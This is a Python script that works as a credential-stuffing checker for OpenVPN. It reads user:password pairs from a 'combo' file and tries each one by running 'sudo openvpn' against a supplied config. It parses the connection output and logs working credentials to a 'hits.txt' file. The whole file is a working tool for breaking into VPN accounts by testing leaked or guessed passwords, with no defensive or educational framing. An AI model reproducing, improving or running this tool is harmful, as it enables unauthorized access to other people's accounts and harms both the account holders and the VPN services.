import os
import subprocess
import sys

assert (
    len(sys.argv) == 3
), f"Invalid arguments\n\
	 Usage: {__file__} <CONFIG> <COMBO>"

CONFIG = sys.argv[1]
COMBO = sys.argv[2]


def create_temp_file(user, passwd):
    """Creates a temp file that
       Openvpn config will read this file
       for username and password.

    Args:
            user (str): username
            passwd (str): password

    Returns:
            None: nothing
    """
    temp_file_name = "temp.txt"
    if os.path.isfile(temp_file_name):
        os.remove(temp_file_name)
    with open(temp_file_name, "a+") as temp_file:
        temp_line = f"{user}\n{passwd}"
        temp_file.write(temp_line)
    return None


def get_conn_status(user, passwd, output):
    """_summary_

    Args:
            user (str): username
            passwd (str): password
            output (str): connection output

    Returns:
            Boolean or None: if connection Success -> True
                                            if connection Failed -> False
                                            waiting -> None
    """
    if "Initialization Sequence Completed" in output:
        out = f"{user}:{passwd}\n"
        with open("hits.txt", "a+") as hit_file:
            hit_file.write(out)
            hit_file.flush()
        return True
    elif (
        len(output.strip()) == 0
        or "TLS Error" in output.strip()
        or "AUTH_FAILED" in output.strip()
        or "Restart pause, 5 second(s)" in output.strip()
    ):
        return False
    else:
        return None


def run(CONFIG, COMBO):
    """This module gets CONFIG, COMBO files
       and extracts user and passwords
       then check them with openvpn command
       on Unix systems.
    Args:
                    CONFIG (File): OpenVpn config file
                    COMBO (File): User password files
    """
    try:
        with open(COMBO, "r") as passwords_files:
            for counter, line in enumerate(passwords_files.readlines()):
                user, passwd = line.strip().split(":")
                create_temp_file(user, passwd)

                x = subprocess.Popen(
                    ["sudo", "openvpn", "--auth-nocache", "--ping-exit", "3", "--config", CONFIG],
                    stdout=subprocess.PIPE,
                    universal_newlines=True,
                )
                print(counter + 1, ") ", line.strip("\n"))
                while True:
                    output = x.stdout.readline()
                    status = get_conn_status(user, passwd, output)
                    if status:
                        print("---> Successfully Connected!", end="\n\n")
                        break
                    elif status == False:
                        print("---> Failed!", end="\n\n")
                        break
    except FileNotFoundError:
        print("Combo not found.")


if __name__ == "__main__":
    run(CONFIG, COMBO)
